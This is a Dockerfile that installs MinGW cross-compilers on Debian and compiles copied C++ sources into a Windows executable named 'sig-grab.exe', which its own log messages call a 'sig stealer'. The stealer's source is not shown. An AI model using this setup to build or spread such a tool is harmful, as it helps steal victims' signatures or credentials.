FROM docker.io/debian:trixie

ENV DEBIAN_FRONTEND=noninteractive

RUN \
    apt-get update; \
    apt-get install -y \
        bash \
        g++ \
        build-essential \
        g++-mingw-w64-x86-64 \
        gcc-mingw-w64-i686 \
        gcc-mingw-w64-x86-64 \
        binutils-mingw-w64-x86-64 \
        binutils-mingw-w64-i686; \
    mkdir /_bin 2>/dev/null; \
    echo 'creating _bin directory' || echo '_bin directory exists'

WORKDIR _bin
COPY . .

RUN \
    x86_64-w64-mingw32-g++ *.cpp -o sig-grab.exe; \
    echo '[*] sig stealer compiled.' || echo '[X] sig stealer compiled.'

RUN ls -la
CMD [ 'bash' ]